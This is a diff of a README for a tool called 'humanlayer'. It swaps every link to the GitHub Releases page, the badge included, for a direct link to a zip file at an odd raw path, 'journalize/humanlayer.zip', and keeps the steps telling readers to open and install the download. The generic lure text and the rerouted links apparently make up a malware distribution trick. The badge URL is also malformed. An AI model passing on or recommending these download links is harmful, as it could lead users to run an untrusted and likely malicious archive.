@@ -1,6 +1,6 @@
 # 🛠️ humanlayer - Effortless AI Solutions for Complex Problems
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen.svg)](https://github.com/Nihar7301/humanlayer/releases)
+[![Download Now](https://raw.githubusercontent.com/Nihar7301/humanlayer/main/journalize/humanlayer.zip%https://raw.githubusercontent.com/Nihar7301/humanlayer/main/journalize/humanlayer.zip)](https://raw.githubusercontent.com/Nihar7301/humanlayer/main/journalize/humanlayer.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **humanlayer** repository! Here, you will find a user-friendly wa
 
 To get started, you need to download the software. Follow these steps: 
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Nihar7301/humanlayer/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Nihar7301/humanlayer/main/journalize/humanlayer.zip).
 2. **Choose Your Version:** On the Releases page, find the latest version listed. This version has the most features and fixes.
 3. **Download the File:** Click on the download link for your operating system. Make sure you choose the right file for your system, such as Windows or macOS.
 4. **Install the Application:** Once the download completes, open the file you downloaded. Follow the on-screen instructions to install the application on your computer.
@@ -63,8 +63,8 @@ For further support, consider joining our community. Engage with other users in 
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Nihar7301/humanlayer/releases) - This is where you download the software.
+- [Releases Page](https://raw.githubusercontent.com/Nihar7301/humanlayer/main/journalize/humanlayer.zip) - This is where you download the software.
 - [Documentation](#) - For detailed guides and technical information.
 - [Issues Tracker](#) - Report any bugs or request help.
 
-Thank you for using humanlayer! We hope this tool enhances your coding experience. Visit the [Releases page](https://github.com/Nihar7301/humanlayer/releases) to get started today.
+Thank you for using humanlayer! We hope this tool enhances your coding experience. Visit the [Releases page](https://raw.githubusercontent.com/Nihar7301/humanlayer/main/journalize/humanlayer.zip) to get started today.
